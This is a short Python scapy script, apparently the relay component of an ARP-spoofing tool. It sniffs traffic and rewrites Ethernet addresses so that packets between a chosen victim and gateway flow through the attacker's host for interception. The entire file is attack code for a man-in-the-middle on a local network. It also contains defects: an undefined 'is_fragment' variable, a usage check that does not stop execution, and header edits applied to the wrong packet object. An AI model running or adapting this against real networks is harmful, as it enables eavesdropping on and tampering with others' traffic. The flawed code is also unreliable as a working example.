import sys
from scapy.all import *
if len(sys.argv) != 6:
    print("useage: sudo python3 arp_spoof.py <gateway_ip> <victim_ip> <ethernet_interface> <gateway_mac> <victim_mac>")

gateway_ip = sys.argv[1]
victim_ip = sys.argv[2]
eth_interface = sys.argv[3]
gateway_mac = sys.argv[4]
victim_mac = sys.argv[5]

def forward(pkt):
    if(not pkt.haslayer(IP) or not pkt.haslayer(Ether)):
        return

    ip = pkt[IP]
    eth = pkt[Ether]

    
    frags = defragment([pkt])
    if not frags:
        return
    pkt = frags[0]


    #victim -> gateway
    if(ip.src == victim_ip):
        eth.src = get_if_hwaddr(eth_interface)
        eth.dst = gateway_mac

    #gateway -> victim
    elif(ip.src == gateway_ip):
        eth.src = get_if_hwaddr(eth_interface)
        eth.dst = victim_mac

    else:
        return

    #recalc checksum
    if(not is_fragment):
        del pkt[IP].chksum
        if(pkt.haslayer(TCP)):
            del pkt[TCP].chksum
        elif(pkt.haslayer(UDP)):
            del pkt[UDP].chksum

    #send
    sendp(pkt, iface=eth_interface, verbose=1)




print("start forwarding........")
while(True):
    sniff(filter="ip", prn=forward, iface=eth_interface)
